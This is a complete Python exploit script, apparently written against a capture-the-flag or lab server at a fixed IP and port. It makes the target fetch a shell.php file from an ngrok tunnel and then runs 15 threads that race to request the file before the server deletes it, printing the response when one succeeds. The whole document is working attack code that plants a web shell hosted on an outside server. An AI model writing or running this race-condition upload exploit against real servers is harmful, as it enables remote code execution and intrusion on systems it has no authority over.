#!/usr/bin/env python3
import requests
import threading
import time

# Configuration
TARGET_URL = "http://34.185.208.176:32331"
NGROK_URL = "https://ecfd544c5949.ngrok-free.app/shell.php"
FILENAME = "shell.php"

found = False

def upload():
    """Upload the PHP file"""
    data = {"url": NGROK_URL}
    requests.post(TARGET_URL, data=data, timeout=5)

def race(thread_id):
    """Race to access the file"""
    global found
    target = f"{TARGET_URL}/{FILENAME}"
    
    for i in range(200):
        if found:
            break
        try:
            resp = requests.get(target, timeout=2)
            if resp.status_code == 200 and len(resp.text) > 50:
                found = True
                print(f"\n{'='*60}")
                print(f"[+] SUCCESS on thread {thread_id}!")
                print(f"{'='*60}")
                print(resp.text)
                print(f"{'='*60}\n")
                break
        except:
            pass
        time.sleep(0.002)

def main():
    print(f"[*] Target: {TARGET_URL}")
    print(f"[*] Racing to: {TARGET_URL}/{FILENAME}\n")
    
    # Start racing threads
    threads = []
    for i in range(15):
        t = threading.Thread(target=race, args=(i,))
        t.daemon = True
        t.start()
        threads.append(t)
    
    time.sleep(0.1)
    
    # Trigger upload
    print("[*] Uploading...")
    upload()
    
    # Wait for threads
    time.sleep(10)
    
    if not found:
        print("[-] Failed to catch the file")

if __name__ == "__main__":
    main()
